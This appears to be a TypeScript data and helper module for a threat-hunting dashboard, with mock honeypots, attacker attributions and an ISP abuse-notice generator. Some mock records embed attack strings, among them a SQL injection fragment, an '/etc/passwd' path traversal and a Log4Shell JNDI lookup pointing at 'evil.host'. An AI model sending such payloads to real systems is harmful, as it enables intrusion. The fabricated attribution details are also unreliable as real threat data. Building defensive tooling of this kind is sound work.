import { 
  TargetAsset, 
  AttackerAttribution, 
  HoneypotSensor, 
  ThreatHuntSummary 
} from '../types/threatHunt';

export const INITIAL_TARGET_ASSETS: TargetAsset[] = [
  {
    id: 'asset-01',
    domain: 'pay.nexus-banking.corp',
    assetType: 'FINANCIAL_CHECKOUT',
    environment: 'PRODUCTION',
    activeThreatsCount: 3,
    protectionStatus: 'UNDER_ATTACK'
  },
  {
    id: 'asset-02',
    domain: 'api.nexus-defense.io',
    assetType: 'API_GATEWAY',
    environment: 'PRODUCTION',
    activeThreatsCount: 2,
    protectionStatus: 'ARMORED'
  },
  {
    id: 'asset-03',
    domain: 'auth.sso-identity.internal',
    assetType: 'IDENTITY_IDP',
    environment: 'PRODUCTION',
    activeThreatsCount: 1,
    protectionStatus: 'MONITORING'
  },
  {
    id: 'asset-04',
    domain: 'db-cluster-eu.nexus.net',
    assetType: 'DATABASE_CLUSTER',
    environment: 'DMZ',
    activeThreatsCount: 0,
    protectionStatus: 'ARMORED'
  }
];

export const INITIAL_HONEYPOTS: HoneypotSensor[] = [
  {
    id: 'hp-01',
    name: 'SSH Port 2222 Decoy Bastion',
    decoyType: 'SSH_BASTION',
    virtualPort: 2222,
    status: 'ARMED',
    trappedAttackersCount: 24,
    lastTrappedAt: '12:14:02',
    description: 'Fake OpenSSH 8.9p1 emulator logging attacker keystrokes and brute-force wordlists.'
  },
  {
    id: 'hp-02',
    name: 'Fake /wp-login.php Honeytoken Trap',
    decoyType: 'ADMIN_PORTAL',
    virtualPort: 443,
    status: 'ARMED',
    trappedAttackersCount: 56,
    lastTrappedAt: '12:08:44',
    description: 'Synthetic WordPress admin endpoint with canary database credentials.'
  },
  {
    id: 'hp-03',
    name: 'AWS IAM Canary Secret Key in Git Decoy',
    decoyType: 'AWS_HONEYTOKEN',
    virtualPort: 80,
    status: 'TRIGGERED',
    trappedAttackersCount: 11,
    lastTrappedAt: '11:45:19',
    description: 'Deliberately leaked fake AWS Access Key ID triggering immediate CloudWatch alarms.'
  },
  {
    id: 'hp-04',
    name: 'Vulnerable MySQL Port 3307 Bait',
    decoyType: 'SQL_INJECTION_BAIT',
    virtualPort: 3307,
    status: 'ARMED',
    trappedAttackersCount: 19,
    lastTrappedAt: '11:22:31',
    description: 'Emulated database listener capturing SQL injection payloads and automated crawler bots.'
  }
];

export const INITIAL_ATTACKERS: AttackerAttribution[] = [
  {
    id: 'att-01',
    ip: '103.114.98.42',
    country: 'Bangladesh',
    countryCode: 'BD',
    city: 'Dhaka',
    latitude: 23.8103,
    longitude: 90.4125,
    isp: 'Link3 Technologies Broadband',
    asn: 'AS58715 Link3-BD',
    reverseDns: 'host-103-114-98-42.link3.net',
    targetDomain: 'pay.nexus-banking.corp',
    targetEndpoint: '/v1/checkout/card-auth',
    attackTechnique: 'Automated Credential Stuffing & Carding Probe',
    mitreId: 'T1110.004',
    userFingerprint: 'Python-requests/2.31.0 (JA3: 771,4865-4866-4867)',
    isHoneypotTriggered: false,
    status: 'ACTIVE_PROBE',
    timestamp: '12:18:05'
  },
  {
    id: 'att-02',
    ip: '185.220.101.5',
    country: 'Netherlands',
    countryCode: 'NL',
    city: 'Amsterdam',
    latitude: 52.3676,
    longitude: 4.9041,
    isp: 'Zwiebelfreunde Tor Exit Node',
    asn: 'AS20473 Choopa Tor Mesh',
    reverseDns: 'tor-exit-amsterdam-node-9.onion.sh',
    targetDomain: 'api.nexus-defense.io',
    targetEndpoint: '/v1/users?id=1%20UNION%20SELECT',
    attackTechnique: 'SQL Injection via Blind UNION Exfiltration',
    mitreId: 'T1190',
    userFingerprint: 'sqlmap/1.7#stable (JA3: 771,49195-49199-52393)',
    isHoneypotTriggered: true,
    honeypotName: 'Vulnerable MySQL Port 3307 Bait',
    status: 'INTERCEPTED',
    timestamp: '12:12:49'
  },
  {
    id: 'att-03',
    ip: '45.148.10.88',
    country: 'Russia',
    countryCode: 'RU',
    city: 'Saint Petersburg',
    latitude: 59.9343,
    longitude: 30.3351,
    isp: 'Selectel Network Services',
    asn: 'AS49505 Selectel',
    reverseDns: 'vps-node-88.selectel.ru',
    targetDomain: 'pay.nexus-banking.corp',
    targetEndpoint: '/admin/config?file=../../../../etc/passwd',
    attackTechnique: 'Path Traversal & Local File Inclusion (LFI)',
    mitreId: 'T1083',
    userFingerprint: 'Mozilla/5.0 (Kali Linux x86_64; rv:109.0)',
    isHoneypotTriggered: false,
    status: 'ACTIVE_PROBE',
    timestamp: '11:58:30'
  },
  {
    id: 'att-04',
    ip: '198.51.100.77',
    country: 'United States',
    countryCode: 'US',
    city: 'Ashburn',
    latitude: 39.0438,
    longitude: -77.4874,
    isp: 'Amazon Web Services Elastic IP',
    asn: 'AS16509 AWS-INFRA',
    reverseDns: 'ec2-198-51-100-77.compute-1.amazonaws.com',
    targetDomain: 'auth.sso-identity.internal',
    targetEndpoint: '/oauth/token?grant_type=client_credentials',
    attackTechnique: 'Canary AWS Honeytoken Key Exfiltration',
    mitreId: 'T1078.004',
    userFingerprint: 'aws-cli/2.15.15 Python/3.11.6 botocore/2.4.15',
    isHoneypotTriggered: true,
    honeypotName: 'AWS IAM Canary Secret Key in Git Decoy',
    status: 'QUARANTINED',
    timestamp: '11:45:19'
  },
  {
    id: 'att-05',
    ip: '103.230.106.19',
    country: 'Bangladesh',
    countryCode: 'BD',
    city: 'Chittagong',
    latitude: 22.3569,
    longitude: 91.7832,
    isp: 'Dot Internet Fiber Network',
    asn: 'AS58715 DotNet-BD',
    reverseDns: 'pool-103-230-106-19.dotnet.com.bd',
    targetDomain: 'pay.nexus-banking.corp',
    targetEndpoint: '/wp-login.php',
    attackTechnique: 'High-Frequency Dictionary Attack on Admin Portal',
    mitreId: 'T1110.001',
    userFingerprint: 'Wfuzz/3.1.0 - The Web Fuzzer',
    isHoneypotTriggered: true,
    honeypotName: 'Fake /wp-login.php Honeytoken Trap',
    status: 'INTERCEPTED',
    timestamp: '11:32:10'
  },
  {
    id: 'att-06',
    ip: '117.253.14.80',
    country: 'Germany',
    countryCode: 'DE',
    city: 'Frankfurt',
    latitude: 50.1109,
    longitude: 8.6821,
    isp: 'Hetzner Online Datacenter',
    asn: 'AS24940 Hetzner-AS',
    reverseDns: 'static.80.14.253.117.clients.your-server.de',
    targetDomain: 'api.nexus-defense.io',
    targetEndpoint: '/cluster/exec?cmd=${jndi:ldap://evil.host}',
    attackTechnique: 'JNDI / Log4Shell Remote Code Execution Exploit',
    mitreId: 'T1190',
    userFingerprint: 'curl/7.88.1 (x86_64-pc-linux-gnu)',
    isHoneypotTriggered: false,
    status: 'QUARANTINED',
    timestamp: '10:55:00'
  }
];

const LOCAL_STORAGE_KEY_ATTACKERS = 'nexus_threat_hunt_attackers_v1';
const LOCAL_STORAGE_KEY_HONEYPOTS = 'nexus_threat_hunt_honeypots_v1';

export function loadAttackers(): AttackerAttribution[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY_ATTACKERS);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch {
    // Storage fallback
  }
  return INITIAL_ATTACKERS;
}

export function saveAttackers(attackers: AttackerAttribution[]): void {
  try {
    localStorage.setItem(LOCAL_STORAGE_KEY_ATTACKERS, JSON.stringify(attackers));
  } catch {
    // Storage quota fallback
  }
}

export function loadHoneypots(): HoneypotSensor[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY_HONEYPOTS);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch {
    // Storage fallback
  }
  return INITIAL_HONEYPOTS;
}

export function saveHoneypots(honeypots: HoneypotSensor[]): void {
  try {
    localStorage.setItem(LOCAL_STORAGE_KEY_HONEYPOTS, JSON.stringify(honeypots));
  } catch {
    // Storage quota fallback
  }
}

export function quarantineAttacker(attackers: AttackerAttribution[], id: string): AttackerAttribution[] {
  const updated = attackers.map(att => {
    if (att.id === id) {
      return {
        ...att,
        status: 'QUARANTINED' as const
      };
    }
    return att;
  });
  saveAttackers(updated);
  return updated;
}

export function triggerHoneypot(honeypots: HoneypotSensor[], id: string): HoneypotSensor[] {
  const updated = honeypots.map(hp => {
    if (hp.id === id) {
      return {
        ...hp,
        status: 'TRIGGERED' as const,
        trappedAttackersCount: hp.trappedAttackersCount + 1,
        lastTrappedAt: new Date().toLocaleTimeString()
      };
    }
    return hp;
  });
  saveHoneypots(updated);
  return updated;
}

export function generateIspAbuseNotice(attacker: AttackerAttribution): string {
  return `To: abuse@${attacker.isp.toLowerCase().replace(/[^a-z0-9]/g, '')}.net, abuse-mailbox@iana.org
Subject: [URGENT] Security Incident & Abuse Report: Malicious Traffic from ${attacker.ip} (${attacker.asn})
Date: ${new Date().toUTCString()}
X-Complaints-To: abuse@nexus-ai-defense.corp

Dear Abuse Desk & Network Security Operations Center,

This is an automated RFC 2142 security notification from the NexusAI Autonomous Threat Intelligence Defense System.

A host allocated within your autonomous subnet (${attacker.asn}) has been verified actively executing hostile cyber attacks against our protected infrastructure.

=== INCIDENT FORENSIC ATTRIBUTION ===
Attacker Source IP : ${attacker.ip}
Origin Location    : ${attacker.city}, ${attacker.country} (${attacker.countryCode})
Reverse DNS Host   : ${attacker.reverseDns}
Autonomous System  : ${attacker.asn} (${attacker.isp})
Targeted Asset     : ${attacker.targetDomain}
Targeted Endpoint  : ${attacker.targetEndpoint}
Attack Technique   : ${attacker.attackTechnique}
MITRE ATT&CK ID    : ${attacker.mitreId}
User-Agent / JA3   : ${attacker.userFingerprint}
Timestamp (UTC)    : ${new Date().toISOString()}

=== ACTION REQUESTED ===
1. Immediately quarantine host IP ${attacker.ip} to prevent further lateral intrusion.
2. Investigate potential botnet/C2 malware infection on customer equipment.
3. Confirm receipt of this incident notice by replying with your tracking ticket.

Generated Cryptographically by NexusAI Threat Hunter Engine.
SOC Operations Center: soc-ops@nexus-defense.corp`;
}

export function calculateThreatHuntSummary(
  attackers: AttackerAttribution[],
  honeypots: HoneypotSensor[],
  assets: TargetAsset[]
): ThreatHuntSummary {
  const total = attackers.length;
  const activeHp = honeypots.filter(h => h.status === 'ARMED').length;
  const totalTraps = honeypots.reduce((acc, h) => acc + h.trappedAttackersCount, 0);
  const quarantined = attackers.filter(a => a.status === 'QUARANTINED').length;
  const underAttackAssets = assets.filter(a => a.protectionStatus === 'UNDER_ATTACK').length;

  return {
    totalAttributedAttackers: total,
    activeHoneypots: activeHp,
    honeypotTrapsFired: totalTraps,
    quarantinedIps: quarantined,
    underAttackAssetsCount: underAttackAssets
  };
}
